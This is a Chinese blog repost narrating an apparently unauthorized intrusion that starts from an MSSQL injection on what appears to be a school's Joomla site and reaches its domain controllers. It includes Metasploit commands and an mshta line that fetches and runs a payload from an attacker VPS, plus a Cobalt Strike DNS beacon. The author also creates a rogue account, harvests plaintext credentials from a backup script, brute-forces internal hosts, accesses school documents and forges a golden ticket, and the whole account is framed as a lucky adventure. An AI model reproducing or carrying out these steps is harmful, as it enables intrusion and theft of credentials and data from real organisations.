#  SQL注入漏洞引起的内网渗透 | 实战   
 渗透安全团队   2024-02-26 22:06  
  
**一 、 前言**  
  
近期一直再学习内网渗透，实验什么的都是玩玩靶机。  
  
  
这一天朋友说有个站点有漏洞，就发过来看了一些是一个SQL注入，继而开启了这次内网渗透。  
水平有限，并且初学哈哈哈哈！  
没有什么技术要点纯属误打误撞，如果有什么错误的地方希望大佬多多指点！  
  
**二 、 WEB点进入内网**  
  
这次渗透是从站库分离的情况下在深入进去内网在拿下域控服务器，也都是普通的渗透思路，并没有什么技术含量！  
  
首先WEB点是一个MSSQL注入漏洞，并且这个注入是sa权限的！  
  
首先这个站点是使用JoomlaCMS搭建的，但是在一处Study信息登记处发现了SQL注入漏洞   
  
接着抓下此处查询的数据包进行注入，并且或者了是高权限，可以开启xp_cmdshell来进行进一步的提权。  
  
在注入的返回的指纹信息可以获知对方的操作系统大概率就是windows Server 2012系统   
  
那么接下来不用想就是直接提权到MSF上面了，这里使用hta来提权到MSF  
  
msf5 > use exploit/windows/misc/hta_servermsf5 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_httppayload => windows/meterpreter/reverse_httpmsf5 exploit(windows/misc/hta_server) > set lhost VPS_IPlhost =>  VPS_IP  
  
这里就开始监听断开，然后需要在对方哪里执行命令。  
  
如下  
  
接着在执行 mshta.exe http://VPS_IP:8080/IAKWSlu.hta  
  
执行之后对方直接上线MSF了，这里可以看到对方的主机名称就叫DATABASE.  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NOCm7G4MKjugpMwRXp73f6ibicHicibib7PHv6YKlzubPlOVDhRDnyooBv2g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.28349284713558687 "")  
  
看似一切顺利，但是往往都不会如自己想的那样，上线之后一直不能执行命令，都返回超时。在VPS的流量过去应该也不会有多大的阻碍啊！  
  
也许是被对方的一些设备拦截了吧！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NLeMjMyRsaDnBTLptZtMPcCSJvicmfHfaneClPtXKWdjlibYJMJbeTNuQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.641839771970748 "")  
  
既然MSF不能操作的话，SQLMAP提供的shell也不是很好操作，那么可以试着写入webshell进入到对方主机上面。  
  
但是我查找了一番并无WEB路径，这里时候想起了它的主机名称，会不会是一个站库分离的网站。  
  
对于MSSQL注入查询是否站库分离很简单  
  
select @@servernameselect host_name()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593Ndn2fibyH014mhmRm8c4kBBH1Qmn6IWCdT2EwibRib0Ms1iawkdSjgnKHwA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.2298661274937157 "")  
  
果不其然这里的确就是站库分离。  
  
既然是MSF的流量比较明显，也不能写入webshell，那么我现在就希望能让其上线CobaltStrike吧！  
  
经过一番测试发现HTTP流量也是返回不了Beacon那么我就使用DNS隧道来上线。  
  
首先需要配置域名解析到CS的服务器上面，并且执行NS记录。这里就略过过程了。  
  
首先生成DNS隧道监听。主机这里填写A记录  
  
   
  
接着会弹出来要给框，这里需要填写的就是填写域名解析的NS记录了！  
  
  
接着使用powershell来让其上线，但是发现在SQLMAP的shell中这里显示无法使用powershell。  
  
这里可能是用户的原因吧！这里的用户是mssql用户。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NYOnwFxXKLMkCLlKUKuia9yRedAWMKwoBHZZpcVJxb8cSF117dHgxyibQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.8931558160549988 "")  
  
如果不能使用Powershell上线，那么可以使用CS的hta文件上线。  
  
利用CS生成hta文件然后挂到CS服务器上面，接着在shell中顺利执行，并且CS上线小黑框！看来上线有望了！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NmSn1HY0fRHGw7VQhGlwrcfDXfgXLicVicjIr3jRwxWXwS6na0bzjGzCA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.8676067412749393 "")  
  
使用tcpdump监听53端口的流量，可以看到这里目标已经开始连接CS服务器了！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NvswAAg7AyGMMxvj1MgCrlCGHExWMshlD2XkBLMK8JAtaHs3FP5jMibQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.22136581041166048 "")  
  
上线之后，使用ipconfig /all查看当前IP。  
  
发现DNS这里存在域名，这里初步推测是存在域环境的。  
  
并且当前的主机在10段的网段中。在往下看可以看到DNS服务器由两个IP地址。  
  
这里初步推断这就是域控了！  
  
因为一般安装域控的话都会安装DNS服务器，并且解析到域控上面！  
  
  
接着使用systeminfo来查看主机的信息。可以看到系统是windows2012的系统，并且可以确定的是由域环境。  
  
并且但是打的补丁很多，当前的权限是mssql权限，必须提权才能进行下一步渗透！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NXRH2XI8yKDnc8DBs89ftRIibKLB6OhYktbbQ9kiaWfQ8zEzVgZib5RwvQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.2594413453864015 "")  
  
试ping一下DNS的主机名称。  
  
是可以ping的通的完全没有问题，如果不同的话也不应该哈哈哈！！  
  
可以看到DNS的IP地址为10.10.10.2。  
  
如果这个域不大的话那么应该可能这个就是域控了！但是奇怪的就是有的时候也会出现10.10.10.4！  
  
还有就是！当我访问www的域名的时候，它会给我转跳到web的域名上面去。  
  
所以我怀疑10.10.10.1这台主机并不是真正的提供WEB的服务器！  
  
也就是不是JoomlaCMS这个WEB的服务器  
  
   
   
  
接着对内网的机器进行探测，这里可以使用K8gege的龙珠插件，对这个网段进行探测。最后在进行判断。  
  
这个域是由三个DNS服务器的！  
  
并且从探测信息返回的主机名称看，这三个DNS服务器就是域控了！  
  
并且WEB服务器就是10.10.10.1这台服务器，因为在先前判断站库分离的时候已经知道WEB服务器的名称了！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NW0NRFVJwricP2TyOVhLnjIFbOzzRxWpcXUKyPavicSrmibEVHdftnkWPA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.6627769336325804 "")  
  
接下来就开始提权了！这里可以利用systeminfo输入的补丁信息复制到提权辅助页面上面进行补丁比对https://bugs.hacking8.com/tiquan/  
  
也可也利用MSF上面的post模块上的本地提权插件来进行获取提权漏洞信息。  
  
这里我把会话传递到MSF上，并且使用本地提权查询模块  
  
msf5 exploit(windows/misc/hta_server) > use post/multi/recon/local_exploit_suggestermsf5 post(multi/recon/local_exploit_suggester) > set session 1msf5 post(multi/recon/local_exploit_suggester) > run  
  
这里MSF返回信息说可以利用ms16-075。话不多说直接提权开搞！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593Nr5WO8BNefL23EaDzicEjpbH937BKcd0EibjGsRPMwNia34WCZSQUiaShOg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.03319817861120167 "")  
  
利用CS的本地提权插件里面的potato提权漏洞进行提取成功。  
  
提取到了system权限本来是可以获取对方的哈希的，因为是windows 2012的操作系统这里无法获取明文。  
  
但是这台机器开启了LSA保护吧！连mimikatz都不能执行了，返回5结尾的报错！  
  
所以我直接创建一个用户用于等下连接3389  
  
   
  
接下来可以利用代理进入对方的内网，我测试了一下CS自带的socks代理并不是很好，有的时候会卡住。  
  
这里我选择上传iox来进行代理  
  
  
进入内网之后直接开搞！首先可以对内网的永恒之蓝的机器进行扫描。  
  
成功扫描除了10.10.10.41和10.10.10.37这两台机器是存在永恒之蓝漏洞的！  
  
这里我直接打10.10.10.41，它的操作系统是windows 7 。10.10.10.37是windows 2003的系统先不搞！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NrknGcu27eRvmuPvDoJfEvtOicP1GicGxgvBFSicOy9cQeKMAl70WdMn3g/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.1384077896074145 "")  
  
MSF给我连续打了好几波！但是都没有成功！这里应该是失败了！  
  
对端设备有防火墙或者杀软的软件拦截了吧。  
  
  
**三、 失去权限！重新再次进入内网**  
  
这个时候已经是晚上四点钟了，肝不下去了直接睡觉！谁知道第二天一起来CS的Beacon已经掉线，并且还上线不了了！！！！  
  
可能管理员已经发现并且加固了服务器了！  
  
如果对方没有把我的VPS禁止的话那还行可以继续进行渗透的！  
  
首先再VPS上面进行icmp流量！  
  
然后在目标Ping服务器，发现流量是可以通的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NllGlAMKD1bEUd0TOLcvEf5aydTZmeyhP3XInWenWRadeLZx0CHyaMQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.43706942420225947 "")  
  
上次上传的iox已经被管理员给删除了，接下来的话需要在下载过去。  
  
接着测试HTTP流量也是完全可以的。两端可以通讯HTTP流量。  
  
那么就可以通过VPS开启HTTP服务下载软件到对方的服务器上面  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593Np2hKxE9RvKVpmy4tpzScmEnRJ7H2Ft2CSl5vfeNs4lbtr1wSDtxWYA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.6665579991072785 "")  
  
这里我不选择iox来进行代理了，应为我现在已经失去了一个CS的稳定控制，这里我选择VENOM这个代理工具，这个代理工具在代理成功之后可以使用shell命令获取一个CMD的shell。  
  
这里就可以免去SQLMAP那个shell了！！  
  
  
接着代理进去之后本来想用之前创建的账号进行登陆的，但是当时没有创建隐藏用户，登陆不上去了。  
  
这个时候我对这台数据库进行信息收集，既然是数据库服务器，那么敏感的信息一定有。可以使用如下命令进行  
  
dir  /s /b *.txtdir  /s /b *.batdir  /s /b *.xml  
  
这里我在C盘的目录下惊喜的发现，这有敏感的批处理文件，名字大概的意思就是备份数据库。  
  
这里我查看里面的信息。  
  
发现里面是对其他服务器进行连接的批处理，并且还有账号名和密码。  
  
真的是太幸运了！这个时候想起一句话：渗透成功的几率是和对方管理员的水平成正比的！！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NhqraWbicAbdlC6bxPbf6w30IXDBfMy02SkchC619HpnD9CWMN8ojp6A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.05053318734804457 "")  
  
这个时候我顿时兴奋了起来！既然管理员通过这样来进行备份，那么他很多管理机器应该都是相同的密码。  
  
接着我整理一下用户名和密码字典。  
  
在代理的情况下对其内网的机器开始爆破破解。爆破出来之后发现域控服务器都在里面！！  
  
  
管理员为了方便管理运维服务器！很多服务器的密码都一样，这里我直接登陆进去10.10.10.5这台数据库服务器看看为啥不能上线了！  
  
进去之后才发现是这个eset。怪不得我上线不了，原来是这个东西在作怪!  
  
  
10.10.10.5这台机器就是数据库，里面由存放除了网站的数据信息之外，还有一些学校里面的一些文档信息。  
  
这台服务器其实就是上次的文档文件之类的都是上传到这里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593Nf4dp9cAqaoRV8pWHgK31QkCpBibLxhMZ2BOnYej9AJhmTlzYBIdmnrA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.9596722356550251 "")  
  
接着登陆到10.10.10.1这台服务器看看！因为这台服务器是解析www的，并且查询学生信息的域名也是www的，那么肯定10.10.10.1是连接MSSQL的。  
  
并且进入到WEB目录下次。  
  
的确这里会转跳到web域名哪里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593N6t7M9AtmuiboQZPjM99wjV9zlVpMynPtNh5SQ6WhqsGRGYSLrY95NYw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.00949265982289127 "")  
  
接着在这台服务器里面发现了MSSQL数据库的连接文件，并且发现了密码  
  
  
接着使用龙珠的插件进行web扫描，  
发现了他的JoomlaCMS的IP地址就是  
10.10.10.45和10.10.10.202  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593N66CgF7PXlDaOr54RficUqv6pzicCiakYTibrGyxQbXJk8MCaZElJgkvr6Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.05866356009269813 "")  
  
然后访问之，发现它的网站是使用xampp搭建的网站，然后再它的配置文件找到了它的数据库连接文件。  
  
这里他也是有phpmyadmin的，如果是内网访问的话是无密码就可以访问，外网是不能访问的！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NSI2zgWP2jE2LIibvKAzmpUYQ4z7Xibhs1wwWUKEInaJDOqqicsPxvjibTA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.959451248856269 "")  
  
接着查看这台机器的arp表项，发现这台机器有对10.10.11.0/24网段的主机进行通信，好家伙！  
  
立刻对这个网段进行探测，然后登陆进来了一台10.10.11.6这台主机。是一台档案机器。  
  
但是10.10.11.0/24这个网段很少机器！有几台tp-link。  
  
还有的大多数都是虚拟机。接着登陆到域控制器上面，这里域控分为三个域控！最后查看了一下发现这个域存在的主机挺多的！  
  
这里可以直接管理这些主机了  
  
  
最后把域控的hash dump下来制作了黄金票据，但是都不能pth了！  
  
看了一下报错大部分显示有防火墙拦截之类的！  
  
但是奇怪的是我再内网翻了一下发现了一处有意思的东西，就是某大佬之前入侵没有抹干净的文本文件。  
  
这里是mimikatz的内网，时间是距离现在的2个月前的3月份哈哈哈哈哈！可能管理员再大佬渗透之后做了加固吧！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGaecyv6D1HT5iaicV3icM593NMas9OVW3cmVVUQ19XkcCRmoibzEUFgicWUzInHFaDhcgM5C3eWSySNiag/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1&random=0.8273230758413543 "")  
  
  
****  
**原文：https://bbs.ichunqiu.com/thread-58227-1-1.html**  
  
如有侵权，请联系删除  
  
  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CR7oAqnjIIbLZqCxwQtBk833sLbiagicscEic0LSVfOnbianSv11PxzJdcicQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CRBgpPoexbIY7eBAnR7sWS1BlBAQX51QhcOOOz06Ct2x1cMD25nA6mJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  

								[                ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489372&idx=1&sn=5e14ba5fa59059fb1ee405e56ef90d40&chksm=c175eaf3f60263e5ef5415a8a9fc134f0890fdb9c25ab956116d17109baf98b3bd6bed572a2d&scene=21#wechat_redirect)  

			                  
  
  
**关 注 有 礼**  
  
  
  
关注下方公众号回复“  
666  
”可以领取一套领取黑客成长秘籍  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
 还在等什么？赶紧点击下方名片关注学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**推荐阅读**  
  
  
  
[干货｜史上最全一句话木马](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[干货 | CS绕过vultr特征检测修改算法](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[实战 | 用中国人写的红队服务器搞一次内网穿透练习](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[实战 | 渗透某培训平台经历](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[实战 | 一次曲折的钓鱼溯源反制](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
